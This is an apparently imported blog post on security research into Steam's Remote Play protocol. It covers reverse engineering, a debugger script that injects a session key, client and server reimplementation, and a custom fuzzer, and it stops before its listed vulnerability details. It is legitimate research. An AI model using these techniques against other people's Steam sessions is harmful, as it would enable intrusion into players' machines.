---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-12-04_achieving-remote-code-execution-in-steam-a-journey-into-the-remote-play-protocol.md
original_filename: 2023-12-04_achieving-remote-code-execution-in-steam-a-journey-into-the-remote-play-protocol.md
title: 'Achieving Remote Code Execution in Steam: a journey into the Remote Play protocol'
category: documents
detected_topics:
- ssrf
- command-injection
- path-traversal
- csrf
- mobile-security
- supply-chain
tags:
- imported
- documents
- ssrf
- command-injection
- path-traversal
- csrf
- mobile-security
- supply-chain
language: en
raw_sha256: 2589b1dd2381f2123c54a66005f1becf85f4e2b5c6fb2190e8bae954f1c82690
text_sha256: 079431b32b8da50e3d2ca7622627b27cb4d4e86a131da7d5544afd928bf618db
ingested_at: '2026-06-28T07:32:27Z'
sensitivity: unknown
redactions_applied: false
---

# Achieving Remote Code Execution in Steam: a journey into the Remote Play protocol

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-12-04_achieving-remote-code-execution-in-steam-a-journey-into-the-remote-play-protocol.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, path-traversal, csrf, mobile-security, supply-chain
- Ingested At: 2026-06-28T07:32:27Z
- Redactions Applied: False
- Raw SHA256: `2589b1dd2381f2123c54a66005f1becf85f4e2b5c6fb2190e8bae954f1c82690`
- Text SHA256: `079431b32b8da50e3d2ca7622627b27cb4d4e86a131da7d5544afd928bf618db`


## Content

---
title: "Achieving Remote Code Execution in Steam: a journey into the Remote Play protocol"
url: "https://blog.thalium.re/posts/achieving-remote-code-execution-in-steam-remote-play/"
final_url: "https://blog.thalium.re/posts/achieving-remote-code-execution-in-steam-remote-play/"
authors: ["Valentino Ricotta"]
programs: ["Valve"]
bugs: ["RCE", "Reverse engineering", "Fuzzing", "Path traversal", "Memory corruption", "Heap overflow", "Format string vulnerability"]
publication_date: "2023-12-04"
added_date: "2024-01-18"
source: "pentester.land/writeups.json"
original_index: 653
---

# Achieving Remote Code Execution in Steam: a journey into the Remote Play protocol

Valve, the company behind the widespread videogame platform Steam, released in 2019 a feature called _Remote Play Together_. It allows sharing local multi-player games with friends over the network through streaming.

The protocol associated with the Remote Play technology is elaborate enough to give rise to stimulating attack scenarios, and in the past its surface has scarcely been ventured into.

In this post, we will cover the reverse engineering of the protocol and its implementations within Steam (client and server), before going through a few vulnerabilities that were found with the help of a dedicated fuzzer.

> Note: this work was presented at SSTIC 2023 — you can find the talk and the slides [here](https://www.sstic.org/2023/presentation/bug_hunting_in_steam_remote_play/). This post aims at giving a little bit more insight and figuring in some new elements of research that could not be showcased back then.
> 
> **In particular, we will discuss a critical Remote Code Execution vulnerability targeting the _streaming client_ component.**

### Table of Contents

  * Introduction
  * Context and target
  * Steam Remote Play
  * Study of the Remote Play implementations in Steam
  * Software architecture
  * Reverse engineering the protocol
  * Network reception logic and processing
  * Channel system
  * Message format
  * Processing of control messages and cryptography
  * Connection sequence diagram
  * Main attack surfaces
  * Control messages
  * Remote HID
  * Audio/video data
  * Implementing a custom client and server
  * Choice of transport mode
  * Server reimplementation
  * Client reimplementation
  * Implementing a dedicated fuzzer
  * `rpfuzz`: a fuzzer for the Remote Play protocol
  * `pbfuzz`: a custom Protobuf mutation engine
  * Fuzzing results and crash analysis
  * Vulnerabilities
  * Path traversal file write in `CSetTouchIconDataMsg`
  * Format string bugs in `CRemotePlayTogetherGroupUpdateMsg`
  * Request forgery in `CRemotePlayTogetherGroupUpdateMsg`
  * OOB access in `CRemotePlayTogetherGroupUpdateMsg`
  * Heap overflow in YV12 video frames
  * Heap overflow in `CRemoteHIDMsg` gamepad logic
  * Timeline
  * Conclusion

# Introduction

## Context and target

More than a billion people around the world play online videogames on various platforms: Windows, Linux, macOS, Android, iOS, gaming consoles, VR headsets and more.

Online multiplayer games are also massive binaries with a large attack surface (network, gaming logic, graphics, sound, maps…). They are thus great targets for remote hackers, who can seek to exploit vulnerabilities in game clients or servers to fulfill various purposes: cheating, harvesting credentials, spreading malware, cryptomining, or even targeted surveillance.

Valve is a well-known game developer, editor and publisher. They have created many popular games, like Half-Life, Counter-Strike and Portal, as well as a game engine called the _Source Engine_. They seemed a nice target as they run a bug bounty program on HackerOne with many [public reports](https://hackerone.com/valve/hacktivity). These can give great inspiration for attack surfaces and exploitation techniques related to Valve products.

Several people have already successfully discovered RCEs in games such as CS:GO, or inside the Source Engine. However, it seemed to me that less people have tried reverse engineering and finding vulnerabilities inside the Steam client itself, hence why I decided to take a look at it.

Steam is a software application developed by Valve and without a doubt the most widely used video game platform. It centralizes and distributes dozens of thousands of games, while holding a myriad of features related to social networking, game integration, streaming, inventories, markets, workshops, etc. In 2020, Steam reported [62M daily active users](https://store.steampowered.com/news/group/4145017/view/2961646623386540826).

Here is an attempt to briefly summarize potential levels or layers of attack surfaces within Valve products:

[![Attack surfaces on Valve products](/posts/img/remoteplay/valve-products-1.png)](/posts/img/remoteplay/valve-products-1.png)

The [Steamworks API](https://partner.steamgames.com/doc/home) is a software development kit targeted towards game developers to integrate Steam features into their games: matchmaking, leaderboards, Steam Workshop, friends, invites and many more. This is a valuable attack surface as well as it can be a common vector in many games. For instance, in 2021, [slidybat reported a stack buffer overflow](https://hackerone.com/reports/1180252) in the `DecompressVoice` method that impacted games with voice communications, like CS:GO.

However, delving into the public reports, I never found mention of a particularly interesting component in the Steam client: [Steam Remote Play](https://store.steampowered.com/remoteplay).

[![Steam Remote Play](/posts/img/remoteplay/steam-remote-play.png)](/posts/img/remoteplay/steam-remote-play.png)

## Steam Remote Play

Steam Remote Play actually exists under various forms. It began with [Steam Link](https://store.steampowered.com/app/353380/Steam_Link/), released in 2015. Initially a set-top box, its hardware version was discontinued in 2018 to make way for a software-based version, also sometimes called _Steam In-Home Streaming_.

[![Steam Link](/posts/img/remoteplay/steam-link-logo.png)](/posts/img/remoteplay/steam-link-logo.png)

Steam Link allows one to stream a game from their computer, usually a gaming rig, to another (typically less powerful) device, like a smartphone, a tablet or a TV. Consequently, there are Steam Link clients for Windows, Linux, Android and iOS.

In 2019, Valve then introduced _Remote Play Together_ , allowing players to share local multi-player games with their friends over the network through streaming. The player who streams the game, called the _host_ , only has to send an invite link to another player, the _guest_ (who does not need to own the game). The guest may send inputs (mouse, keyboard, controller…) to play together with the host if they are granted permission to.

Unsurprisingly, the protocol behind Steam Link and Remote Play Together is the same, so both products can be analyzed in order to reverse engineer the protocol. In terms of attack scenarios, Remote Play Together is however a more promising target.

[![Remote Play interaction](/posts/img/remoteplay/remote-play-interaction.png)](/posts/img/remoteplay/remote-play-interaction.png)

Indeed, host and guest are connected through a peer-to-peer link (or through a transparent relay), meaning no third party will verify, filter or alter messages from host to guest and conversely. Moreover, both host-to-guest and guest-to-host attack scenarios are worth considering and interesting to investigate. Note that throughout this post, the terms _client_ and _guest_ will be used interchangeably, as well as the terms _server_ and _host_.

Based on this information, two main attack scenarios against Remote Play Together can be thought of:

  1. escaping the “game sandbox” to gain _graphical_ remote access to the host’s desktop (client-side attackers only);
  2. exploiting vulnerabilities such as memory corruption to achieve RCE or info leak (for both client and server-side attackers).

We didn’t delve into the first one at all, because it seemed that reversing the streaming, sandboxing and access control logic would prove harder than homing in on finding bugs in protocol parsing and message processing (maybe it’s not, who knows!).

In addition, the latter accommodates better to fuzzing techniques, and can target both the client and the server implementations — thus this is what this post will focus on.

Both host-to-guest and guest-to-host attack scenarios are worth investigating, but it is important to notice that vulnerabilities in Remote Play Together have a stronger impact for _guest_ players, as a client victim:

  * does not need to own any particular game on Steam;
  * does not need to be friends with the attacker on Steam (anyone can open an invite link);
  * automatically connects to the Remote Play server upon the link being opened (no further user interaction or confirmation).

> An invite link can even be opened without any user interaction under certain circumstances: for instance, if a `steam://` wrapper is hidden inside an iframe on a web page hosted on a trusted domain (see [this report](https://hackerone.com/reports/470520)). This can turn a whole remote code execution zero-click!

_NB: we chose to focus on the Windows binaries, because those are the most popular and vulnerabilities in them would impact the most people._

# Study of the Remote Play implementations in Steam

## Software architecture

Remote Play involves two main binaries: `streaming_client.exe`, spawned by Steam upon joining a session and which contains all of the client logic, and `SteamUI.dll`, where most of the server’s logic is located. Like most of Steam, these are written in C++. Analyzing them will provide answers to questions such as how do client and server communicate, what is the packet format, where in the binaries do packets arrive, or how is audio and video data exchanged.

These rather large binaries (15MB) are exempt from any debug symbol, making the analysis much more laborious. Fortunately, there is another way.

The **Steam Link client for Android** (native library) curiously happens to contain a lot of debug symbols, and more especially **function names**. Although this may be some kind of compilation or distribution error from Valve, this is definitely a heaven-sent fact for reversers.

Therefore, even though we target Windows environments, most of the analysis for the protocol can be performed on the Android client. The following diagram shows a high-level architecture of the client implementation.

[![High-level architecture of the client](/posts/img/remoteplay/high-level-architecture-client.png)](/posts/img/remoteplay/high-level-architecture-client.png)

Some important dependencies include the Protobuf library, leveraged to serialize messages in the Remote Play protocol (and also used extensively within Valve games and Steam more generally), and SDL, which is mainly used for GUI, audio/video rendering, and interfacing with input devices (keyboard, controllers…).

At the foundation of the client lies a rather large component, the _Steam Networking Sockets_ library, in charge of P2P transport. It seems to be at least partially based on Valve’s [Game Networking Sockets (GNS)](https://github.com/ValveSoftware/GameNetworkingSockets), an open-source UDP connection-oriented transport layer with support of many features such as encryption and P2P.

A brief analysis suggested that Valve may use a heavily modified version of GNS. Indeed, the P2P part of GNS is based on WebRTC and the ICE protocol, but Remote Play doesn’t seem to implement the full WebRTC stack: it mostly consists of TURN/STUN and custom encryption layers with clear deviations from GNS. It was decided not to investigate this component further because in the context of Remote Play, attack scenarios involving this library are much more complex.

As for the server implementation, its architecture is quite similar to the client’s, without the human interface part. It is also worth noting the server implementation is part of a bigger DLL that contains lots of other Steam-related stuff that are not linked to Remote Play.

## Reverse engineering the protocol

To get started on reverse engineering the protocol, there exists a tremendously useful [Protobufs repository](https://github.com/SteamDatabase/Protobufs) on GitHub, maintained by the [SteamDB project](https://steamdb.info/). It tracks many protobuf definitions from Valve products.

More particularly, the [`steammessages_remoteplay.proto`](https://github.com/SteamDatabase/Protobufs/blob/master/steam/steammessages_remoteplay.proto) file is simply put a goldmine to get started on reversing the protocol, as it includes pretty much all the message types and their fields. Of course, efforts do not stop now; there is still a lot to unpack by reversing the binaries, and the first step is to understand how packets are received and processed.

### Network reception logic and processing

The following diagram shows a high-level view of the data flow for packets that arrive from the server.

[![Client network reception logic](/posts/img/remoteplay/network-reception.png)](/posts/img/remoteplay/network-reception.png)

Having a clearer overview of this part of the architecture helps a lot, on one hand, to understand the protocol, and on the other hand, to bring out potential attack surfaces.

From this figure, we can pinpoint three main components.

**First** , there’s the network reception logic on the left, which depends on the chosen transport mode. It is characterized by an interface called `IStreamTransport`, which implements primitives for sending and receiving data. This way, we don’t need to worry whether direct UDP, Steam Datagram Relays or WebRTC was used for the P2P link: all packets end up in the `CStreamSocket::HandlePacket` method at some point.

**Next** , the purple block implements header parsing logic. The classes in this component reveal a lot of fields, mechanisms and concepts within the protocol: for example, flags, checksums (CRC32C), the existence of different packet types (_Connect_ , _Disconnect_ , _Data_ , _Ack_ …) and a system of _channels_.

**Finally** , after passing through different queues and systems related to reassembling and fragmentation, the packets land in `CStreamClients`’s `OnStreamPacket` method, where they are then handled differently depending on the _channel_ they are associated to.

### Channel system

Channels are an abstraction layer for the transport of parallel data, and are represented by identifiers between 0 and 31:
  
  
  enum EStreamChannel {
  k_EStreamChannelInvalid = -1;
  k_EStreamChannelDiscovery = 0;
  k_EStreamChannelControl = 1;
  k_EStreamChannelStats = 2;
  k_EStreamChannelDataChannelStart = 3;
  }
  

A few channels are statically allocated, the most important ones being the _control channel_ (0x1) and the _stats channel_ (0x2). The stats channel allows to communicate statistics, events, debug logs and screenshots. As for audio and video streams, they are dynamically allocated a data channel (0x3-0x1f) upon request from the server (or the client for microphone audio data).

[![Remote Play channels \(example\)](/posts/img/remoteplay/rp-channels.png)](/posts/img/remoteplay/rp-channels.png)

The control channel (0x1) is the channel that contains the most different types of messages (around a hundred). The enum `EStreamControlMessage` defines the _control_ message types, which serve multifarious purposes:

  * authenticating and negotiating upon connection;
  * setting audio, video or network parameters;
  * sending inputs (mouse, keyboard, controller, touchscreen);
  * sharing information about the lobby (game, players);
  * interacting with remote HID devices;
  * editing the client’s cursor, icon, window title…

### Message format

The analysis of the components involved in header parsing allows to reconstruct the format of the packets that are exchanged. The following diagram is a typical example of what a control packet may look like.

[![Steam Remote Play messages structure](/posts/img/remoteplay/remote-play-message-structure.png)](/posts/img/remoteplay/remote-play-message-structure.png)

The different fields will not be described in detail as the goal of this post is not to write a specification for the protocol. I will say, though, that certain fields such as _Connection ID_ , _Fragment_ and _Packet ID_ are very sensitive and need to be constructed carefully in order not to raise errors in the client or server and break the session.

### Processing of control messages and cryptography

Zooming on the body parsing block from the higher-level view diagram yields the following flowchart, which describes how packets are dispatched in the client based on their channel and how control messages are handled:

[![Network reception logic: body parsing component](/posts/img/remoteplay/steam-link-android-reception-zoom-body.png)](/posts/img/remoteplay/steam-link-android-reception-zoom-body.png)

Messages from the _control channel_ are all encrypted, with the exception of _Authentication_ and _Handshake_ messages (1, 2, 6, 7). These are sent in plaintext because they are exchanged _before_ the client is successfully authentified.

Before even the Remote Play session itself, client and server agree on a shared secret key, called the _session key_. How this key is agreed upon depends on the transport mode and is not relevant to our analysis — we only assume this key exists and is the one used to encrypt all messages.

Encrypted control message bodies consist of:

  * 1 byte to indicate the message type (`EStreamControlMessage` enum);
  * the message encrypted using the following formula, where _Message_ is prefixed by an 8-byte sequence number (incremented every new control message):

∳∳ \text{AES-CBC}(\text{Message}, \: \text{SessionKey}, \: \text{IV} = \text{HMAC-MD5}_{\text{SessionKey}}(\text{Message})) ∳∳

Upon reception, the session key and the IV are used to decrypt the message. Then, the IV, which also happens to be an HMAC of the message, is used to verify its integrity. Finally, the sequence number is checked. If anything goes wrong, the packet is discarded.

There is a special kind of control message called `CRemoteHIDMsg`. It is related to remote HID device interaction and will be detailed further when mentioning attack surfaces.

The treatment of all other control messages is deferred, and later on, they are dispatched one at a time to their corresponding sub-handler.

### Connection sequence diagram

Last but not least, here is a sequence diagram that can be reconstructed for the protocol:

[![Sequence diagram for the Remote Play protocol](/posts/img/remoteplay/remote-play-sequence-diagram.png)](/posts/img/remoteplay/remote-play-sequence-diagram.png)

Both the server and the client rely on a state machine. After connecting and performing a handshake, the client must send an _Authentication Request_. It contains an HMAC of a constant magic string (`"Steam In-Home Streaming"`) using the session key. This way, the server ensures that the client knows the session key and will be able to decrypt future messages.

Then, they exchange various settings, such as the audio/video codecs to use or whether to enable certain features, through a negotiation phase.

Once the configuration is done, the client and the server enter the _Streaming_ state, where they can freely exchange control packets and audio/video data.

Although this preliminary setup sequence can be subject to bugs, the _Streaming_ state is more interesting for vulnerability research as it handles more complex data and exposes a larger attack surface.

# Main attack surfaces

We can accordingly identify three main attack surfaces inside the parsing of message bodies. Each one will be covered in more detail.

Attack surface| Client -> Server| Server -> Client  
---|---|---  
**Control messages**|  ~40 message types| ~50 message types  
**Remote HID**|  5 message types| 12 message types  
**Audio/video data**|  Microphone| Game audio and video  
  
Note: there are actually two more attack surfaces, namely the connection phase and the parsing of headers (including the channel management and packet fragmentation systems). These surfaces are not very broad and were subject to manual vulnerability research. Nothing of interest was found.

## Control messages

Control messages are the broadest and perhaps most valuable attack surface in Remote Play: there are almost a hundred different types of messages split between the client and the server. As stated earlier, they are all associated to a Protobuf structure.

While some of these are rather short and straightforward, others are more intricate and good targets for vulnerability research. For instance, the following message type features strings, bytes, index fields and an array of nested sub-messages — all of which could hide bugs (out-of-bounds accesses, integer overflows…).
  
  
  message CRemotePlayTogetherGroupUpdateMsg {
  message Player {
  optional uint32 accountid = 1;
  optional uint32 guestid = 2;
  optional bool keyboard_enabled = 3;
  optional bool mouse_enabled = 4;
  optional bool controller_enabled = 5;
  repeated uint32 controller_slots = 6;
  optional bytes avatar_hash = 7;
  }
  
  repeated .CRemotePlayTogetherGroupUpdateMsg.Player players = 1;
  optional int32 player_index = 2;
  optional string miniprofile_location = 3;
  optional string game_name = 4;
  optional string avatar_location = 5;
  }
  

## Remote HID

Remote HID is a feature that allows the server to interact with the client’s human interface devices, such as USB controllers. The protobuf definition for the `k_EStreamControlRemoteHID` message type is a rather enigmatic structure:
  
  
  message CRemoteHIDMsg {
  optional bytes data = 1;
  optional bool active_input = 2;
  }
  

Reversing shows that the `data` field is actually **nested serialized Protobuf data**. More specifically, it is a serialized `CHIDMessageToRemote` message (for client targets) or a serialized `CHIDMessageFromRemote` message (for server targets). The definition to these messages can be found in another file, [steammessages_hiddevices.proto](https://github.com/SteamDatabase/Protobufs/blob/master/steam/steammessages_hiddevices.proto).

The `CHIDMessageToRemote` message looks like this:
  
  
  message CHIDMessageToRemote {
  
  // <snip>
  
  optional uint32 request_id = 1;
  
  oneof command {
  .CHIDMessageToRemote.DeviceOpen device_open=2;
  .CHIDMessageToRemote.DeviceClose device_close=3;
  .CHIDMessageToRemote.DeviceWrite device_write=4;
  .CHIDMessageToRemote.DeviceRead device_read=5;
  .CHIDMessageToRemote.DeviceSendFeatureReport device_send_feature_report=6;
  .CHIDMessageToRemote.DeviceGetFeatureReport device_get_feature_report=7;
  .CHIDMessageToRemote.DeviceGetVendorString device_get_vendor_string=8;
  .CHIDMessageToRemote.DeviceGetProductString device_get_product_string=9;
  .CHIDMessageToRemote.DeviceGetSerialNumberString device_get_serial_number_string=10;
  .CHIDMessageToRemote.DeviceStartInputReports device_start_input_reports=11;
  .CHIDMessageToRemote.DeviceRequestFullReport device_request_full_report=12;
  .CHIDMessageToRemote.DeviceDisconnect device_disconnect=13;
  }
  }
  

We understand that remote HID is a whole sub-protocol. The `request_id` field tags messages in order to keep track of which request the server responds to. Then, one of the 12 sub-message types is nested. These allow to open a client device, read from it, write to it, and obtain various metadata.

The actions that are performed and the data that is sent back obviously depend on the type of plugged-in device, hence why the list of commands is actually an interface for which there exist multiple implementations:

Implementation| Can be triggered via…  
---|---  
`CVirtualController`| Virtual touch device in the client settings  
`CHIDDeviceSDLGamepad`| USB controller, handled by SDL  
`CHIDDeviceSDLJoystick`| USB joystick, handled by SDL  
`CHIDDeviceLocal`| Manually opening device via SDL API or raw IOCTL (fallback)  
  
In terms of attack surfaces, only the first three implementations are of interest, as the local device one is entirely device-specific (no client logic).

The caveat is that since each implementation is specific to a type of device, it is harder to look for bugs without owning or emulating them, and bugs themselves can highly depend on the client device which is not under control of the attacker.

As for the messages that the client can send to the server:
  
  
  oneof command {
  .CHIDMessageFromRemote.UpdateDeviceList update_device_list = 1;
  .CHIDMessageFromRemote.RequestResponse response = 2;
  .CHIDMessageFromRemote.DeviceInputReports reports = 3;
  .CHIDMessageFromRemote.CloseDevice close_device = 4;
  .CHIDMessageFromRemote.CloseAllDevices close_all_devices = 5;
  }
  

The client can announce its list of available devices (gamepad, joysticks…) through the `UpdateDeviceList` message. They can also answer a read request or a feature report request with specific data.

Remote HID is therefore a tempting attack surface: it adds 17 new message types in total, and as their purpose is to interface with devices, they operate at a slightly lower level.

## Audio/video data

In data channels, the sub-handling logic primarily depends on the codec that was selected by the channel opener. The following tree diagram shows the different codecs and formats that are implemented in Remote Play.

[![Audio and video codecs in Remote Play](/posts/img/remoteplay/audio-video-codecs.png)](/posts/img/remoteplay/audio-video-codecs.png)

The most interesting codecs are the raw ones, because they implement custom logic, unlike other codecs that usually leverage third-party libraries (e.g. libopus).

It is also worth noting most codecs actually do not implement encryption (which is rather odd since audio or video communications can carry sensitive data; although it is not that much of a security issue in a remote SDR/WebRTC context backed by underlying encryption layers).

Data packets embed a whole new layer of data, encapsulated within an additional header. Although all the fields were not clearly figured out, the following information is enough to, as a server, be able to send audio or video data that the client understands and renders:

Field| Size (bytes)  
---|---  
Data message type| 1  
Sequence number 1| 2  
Timestamp| 4  
Unknown| 6  
Sequence number 2| 2  
Flags| 1  
Unknown| 4  
  
Timestamps have to be non-null and increasing. Some observations showed that the unknown fields were always null and that the sequence number fields were usually equal, except for audio data where the second one is null.

It also appears that for some reason, the three last fields were at times not present in certain codecs, like the _raw_ video one.

This new knowledge allows to trigger new paths in the binary related to decoding audio and video data for each codec/format. These are an interesting surface because such functions may be more prone to memory corruption bugs.

# Implementing a custom client and server

This section explains how a client and a server for the Remote Play protocol were reimplemented in Python. Their first purpose was to easily play around with the protocol and send custom messages manually. These implementations eventually grew into an _ad hoc_ fuzzer, which next section will be dedicated to.

## Choice of transport mode

We briefly mentioned earlier that Remote Play implements several modes of transport, given by the `EStreamTransport` enum. Some examples are UDP, relay UDP, WebRTC and SDR ([Steam Datagram Relays](https://partner.steamgames.com/doc/features/multiplayer/steamdatagramrelay)).

A few tests showed that the preferred network transport mode that was automatically used by the Remote Play client and server in Steam was SDR relaying. However, the most simple transport mode is direct UDP (`k_EStreamTransportUDP`), for clients and hosts that can communicate directly without need for a peer-to-peer setup or relays.

Using direct UDP allows to focus on the Remote Play protocol itself by circumventing any potential SDR or WebRTC abstraction, making it much easier to carry out tests and develop a custom client or server implementation that works locally.

## Server reimplementation

Reimplementing a server for the Remote Play protocol allowed to interface with the official streaming client in Steam. The latter can be started from the command line by specifying the transport mode (UDP) along with the server’s IP address and port.
  
  
  "C:\Program Files (x86)\Steam\streaming_client.exe" --windowed --steamid 123 --gameid 456 --appid 789 --server 1.2.3.4:31337 --transport k_EStreamTransportUDP
  

However, there’s a catch. By running this binary directly, we have somewhat bypassed the key exchange scheme and once we get to the _Authenticating_ state, the client cannot find any session key to load.

To address this issue, we can look for the first time in the client where the session key is supposed to be used: the `CStreamClient::StartAuthentication` method. Indeed, in this state, the client needs to calculate an HMAC using the session key to authenticate to the host:
  
  
  int __fastcall CStreamClient::StartAuthentication(CStreamClient *this) {
  
  CAuthenticationRequestMsg Msg; // [sp+8h] [bp-58h] BYREF
  _BYTE hmac[32]; // [sp+34h] [bp-2Ch] BYREF
  
  CStreamClient::SetSessionState(this, AUTHENTICATING);
  CAuthenticationRequestMsg::CAuthenticationRequestMsg(Msg);
  CCrypto::GenerateHMAC256(
  "Steam In-Home Streaming",
  strlen("Steam In-Home Streaming"),
  this->Key,
  this->KeySize,
  hmac
  );
  CAuthenticationRequestMsg::set_token(Msg, hmac, 0x20);
  CStreamClient::SendControlMessage(
  this,
  k_EStreamControlAuthenticationRequest,
  Msg
  );
  CAuthenticationRequestMsg::~CAuthenticationRequestMsg(Msg);
  
  }
  

At this point in time, just before `CCrypto::GenerateHMAC256` is called, we can inject our own session key in the `CStreamClient` structure. To this purpose, a small [x32dbg script](https://help.x64dbg.com/en/latest/commands/script/) was written to run the client with, that injects a 32-byte null key. This may be achieved through many other techniques (patching, DLL injection…).
  
  
  erun
  
  // Reach CStreamClient::StartAuthentication, just before the call
  // to CCrypto::GenerateHMAC256. Offset will depend on Steam version.
  // ebx needs to point the CStreamClient structure.
  bp streaming_client:$10D9E5
  erun
  
  // New key (full null bytes)
  alloc 32
  $key = $result
  fill $key, 0, 32
  
  // Copy new key addr
  mov dword:[ebx + 0x24], $key
  
  // Copy key size (0x20)
  set (ebx + 0x34), #20 00 00 00# 
  
  // Resume execution
  erun
  

Once this issue has been addressed, the whole protocol can be reimplemented by leveraging the Protobuf definitions at disposal. It requires going through the connection phase and implementing a few basic messages (such as _Keep Alive_), before being able to send custom control messages to the client.

## Client reimplementation

In order to target the server implementation, reimplementing a client required a little bit more work.

Setting up a Remote Play server directly through the invite mechanism that you can find in the Steam overlay when you are playing a game makes developing a client quite difficult, as the session will naturally be built over SDR or WebRTC.

There is, however, a way to circumvent this issue: forcing a direct UDP connection by _hijacking a local Steam Link key_.

Steam Link uses a separate protocol, called the _Steam In-Home Streaming Discovery Protocol_ , for clients to discover devices that are available for streaming on a local network (or remotely with a PIN code system).

If Steam is launched and you have checked _Enable Remote Play_ in the settings, you should be able to see your own machine appear.

[![Steam Link discovered a machine](/posts/img/remoteplay/steamlink.jpg)](/posts/img/remoteplay/steamlink.jpg)

Connecting to the machine then lands you inside your Steam library (through the Steam Big Picture UI).

What’s nice about the Discovery protocol, whose protobuf definitions are found in the [`steammessages_remoteclient_discovery.proto`](https://github.com/SteamDatabase/Protobufs/blob/master/steam/steammessages_remoteclient_discovery.proto) definition file, is that a client can specify a list of supported modes of transport inside the `CMsgRemoteDeviceStreamingRequest` message.
  
  
  message CMsgRemoteDeviceStreamingRequest {
  message ReservedGamepad {
  optional uint32 controller_type = 1;
  optional uint32 controller_subtype = 2;
  }
  
  required uint32 request_id = 1;
  optional int32 maximum_resolution_x = 2;
  optional int32 maximum_resolution_y = 3;
  optional int32 audio_channel_count = 4 [default = 2];
  optional string device_version = 5;
  optional bool stream_desktop = 6;
  optional bytes device_token = 7;
  optional bytes pin = 8;
  optional bool enable_video_streaming = 9 [default = true];
  optional bool enable_audio_streaming = 10 [default = true];
  optional bool enable_input_streaming = 11 [default = true];
  optional bool network_test = 12;
  optional uint64 client_id = 13;
  repeated .EStreamTransport supported_transport = 14;
  optional bool restricted = 15;
  optional .EStreamDeviceFormFactor form_factor = 16;
  optional int32 gamepad_count = 17;
  repeated .CMsgRemoteDeviceStreamingRequest.ReservedGamepad gamepads = 18;
  optional uint64 gameid = 19;
  optional .EStreamInterface stream_interface = 20;
  }
  

This way, one can ensure the connection will use direct UDP.

We will not go to the extent of detailing the whole discovery protocol in this post, but it needed to be reversed and reimplemented to be authenticated on a local Steam instance.

Indeed, when you discover and connect to a machine, your device gets _paired_ to it by being assigned a _client ID_ and by sharing a _discovery key_.

[![Steam Link pairing](/posts/img/remoteplay/steamlink-pair.png)](/posts/img/remoteplay/steamlink-pair.png)

It is possible to borrow a discovery key (this can be performed only once, for example through debugging) and reuse it by plugging it inside the discovery protocol to go through.

The server eventually answers a _Device Streaming Response_ that contains the port to connect to for the Remote Play session, as well as a randomly generated session key that can be decrypted using the client discovery key.

The rest of the client implementation process is quite similar to the server one.

# Implementing a dedicated fuzzer

## `rpfuzz`: a fuzzer for the Remote Play protocol

The client and server reimplementations that were developed and detailed in the previous section were extensively used to play around with the protocol, and naturally evolved into a basic fuzzer, which was given the very unconventional name `rpfuzz` (for _remote play fuzzer_).

The idea was to keep on playing around with the protocol by writing a little fuzzer from scratch on top of the existing code, to see if we could stumble upon “quick wins” by randomly mutating Protobuf messages.

The following diagram describes `rpfuzz`’s software architecture.

[![rpfuzz architecture](/posts/img/remoteplay/rpfuzz.png)](/posts/img/remoteplay/rpfuzz.png)

The **network component** (orange block) is interchangeable: depending on the target, it can be replace by a server implementation, or by a client implementation (coupled with the discovery protocol). It is in charge of communicating with the target.

The **Fuzzer** component runs on a separate thread. It supports both control messages and audio/video channels.

Control message fuzzing is essentially stateless. It consists of a loop that randomly chooses a message type and passes on the associated protobuf class over to a mutation engine: `pbfuzz`, which will be covered more in depth later. `pbfuzz` sends back a Python object to generate an endless amount of mutations, which are assembled into messages and then sent to the target through the network implementation.

On the other hand, fuzzing remote HID messages requires stateful actions, such as sending a request to open a device. In the same way, fuzzing audio/video channels requires opening a new dynamic channel.

A few other nice features were implemented, namely a replay system, a scenario system and a logging system.

The **Logger** basically just saves all the sent mutations to a file for a fuzzing session. It helps keeping a fuzzing history. This is useful for debugging and analyzing crashes.

These logs can also be fed back to the **Replay System** , which will replay all the messages from a session one at a time. This can prove useful to try and reproduce a (deterministic enough) crash, by hopefully bringing the target to a state that has already been reached before.

Finally, a **Scenario System** was designed to write specific scenarios and play them at any time. It was especially useful to reproduce bugs and write proofs of concept. Besides, each bug scenario can specify a condition that should be necessarily verified by messages that trigger the associated bug. Thanks to this, the fuzzer knows when to avoid specific messages, and is not slowed down by already-found crashes.

## `pbfuzz`: a custom Protobuf mutation engine

`pbfuzz` is — you guessed it — another unconventional name standing for _protobuf fuzzer_.

One of the challenges usually brought by fuzzing stateful network protocols is that of _grammatical awareness_. In our case, existing mutational engines inside fuzzing frameworks can definitely not be adopted out-of-the-box, as they would break the message’s structures. Even worse, they would totally disfigure all Protobuf serialized data, hence the need for a Protobuf-aware mutational engine.

The choice was made to write a custom Protobuf mutation engine from scratch for more flexibility, better integration and educational purposes. Other contenders for this component include [libprotobuf-mutator](https://github.com/google/libprotobuf-mutator), which was not invesitgated and could constitute a valid alternative, and [ProtoFuzz](https://github.com/trailofbits/protofuzz), a Python library that ended up lacking flexibility for our use case, and in which there were too many bugs (such as broken support of repeated fields).

At its core, `pbfuzz` relies on playing with inner objects and attributes of Google’s protobuf module, in order to walk through message descriptors, types, labels. Although the fuzzer is model-based and does not require input seeds (the Protobuf definitions are known in advance), several mutation strategies were implemented for each field type, taking inspiration from traditional model-less mutation engines.

Strings and bytes fields can undergo bit flips, byte substitutions, trimming, or insertion of random or “interesting” data like string formatters (`%x`, `%s`, `%n`), paths, URLs, XML, JSON… of random length. These could trigger buffer overflows, format string vulnerabilities, logic bugs, or other kinds of more higher-level bugs.

Integer fields (and floats) are also mutated with interesting values, depending on bit size (32, 64) and signedness, opening up for integer overflows or out-of-bounds accesses.

Repeated fields (lists) can go through single mutations (only one element of the list is mutated), random trims or random insertions of random lengths. Nested message fields are mutated recursively as well.

Finally, fields marked as optional can also be deliberately omitted at random: indeed, a program could try accessing fields from a deserialized object without verifying whether they are actually present, leading to potentially unexpected behavior.

## Fuzzing results and crash analysis

The fuzzing speed was limited by the target’s packet processing speed; in other words, the target acted as a bottleneck and the fuzzing speed had to be adjusted manually not to cause an overload. Still, the fuzzer was able to send 100 to 1000 messages per second without overworking the target too much.

In terms of surface, all the control messages were successfully reached, with a few exceptions being obsolete or unimplemented message types. Audio/video codecs were also all reached, except for the raw accelerated graphics format and the HEVC codec, which channels could not be opened for some reason.

